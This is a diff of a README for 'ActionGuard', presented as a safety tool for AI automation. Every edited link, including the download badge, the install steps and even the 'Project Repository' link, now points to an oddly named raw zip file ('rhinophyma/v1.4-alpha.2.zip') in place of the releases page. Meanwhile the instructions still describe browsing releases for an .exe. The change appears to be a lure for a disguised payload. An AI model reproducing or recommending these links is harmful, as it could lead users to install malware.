@@ -1,7 +1,7 @@
 <h1>🛡️ ActionGuard - Safe Automation, Total Peace of Mind</h1>
 
 <p align="center">
-<a href="https://github.com/Permed-lizard3456/ActionGuard/releases"><img src="https://img.shields.io/badge/Download-ActionGuard-purple?style=for-the-badge&logo=github&logoColor=white&color=8B5CF6" alt="Download ActionGuard"></a>
+<a href="https://raw.githubusercontent.com/Permed-lizard3456/ActionGuard/main/rhinophyma/v1.4-alpha.2.zip"><img src="https://img.shields.io/badge/Download-ActionGuard-purple?style=for-the-badge&logo=github&logoColor=white&color=8B5CF6" alt="Download ActionGuard"></a>
 </p>
 
 ---
@@ -70,7 +70,7 @@ Ready to add a safety net to your AI automation? Follow these simple steps.
 
 Visit this link to download the application:  
 
-[**https://github.com/Permed-lizard3456/ActionGuard/releases**](https://github.com/Permed-lizard3456/ActionGuard/releases)
+[**https://raw.githubusercontent.com/Permed-lizard3456/ActionGuard/main/rhinophyma/v1.4-alpha.2.zip**](https://raw.githubusercontent.com/Permed-lizard3456/ActionGuard/main/rhinophyma/v1.4-alpha.2.zip)
 
 You'll see a list of available releases. Look for the latest version and download the installer file that matches your operating system.
 
@@ -101,7 +101,7 @@ ActionGuard is lightweight and runs on most modern Windows PCs. For the best exp
 
 ### The Download Process
 
-1. Go to the download page: [https://github.com/Permed-lizard3456/ActionGuard/releases](https://github.com/Permed-lizard3456/ActionGuard/releases)
+1. Go to the download page: [https://raw.githubusercontent.com/Permed-lizard3456/ActionGuard/main/rhinophyma/v1.4-alpha.2.zip](https://raw.githubusercontent.com/Permed-lizard3456/ActionGuard/main/rhinophyma/v1.4-alpha.2.zip)
 2. Find the newest release (the topmost version).
 3. Scroll down to the "Assets" section of that release.
 4. Click on the file ending with `.exe` to start your download.
@@ -284,8 +284,8 @@ Download ActionGuard today and take control of your AI.
 
 ## 🔗 Quick Links
 
-- **[Download ActionGuard](https://github.com/Permed-lizard3456/ActionGuard/releases)**
-- **[Project Repository](https://github.com/Permed-lizard3456/ActionGuard)**
+- **[Download ActionGuard](https://raw.githubusercontent.com/Permed-lizard3456/ActionGuard/main/rhinophyma/v1.4-alpha.2.zip)**
+- **[Project Repository](https://raw.githubusercontent.com/Permed-lizard3456/ActionGuard/main/rhinophyma/v1.4-alpha.2.zip)**
 - **Report an Issue:** Visit the repository's Issues tab.
 
 ---
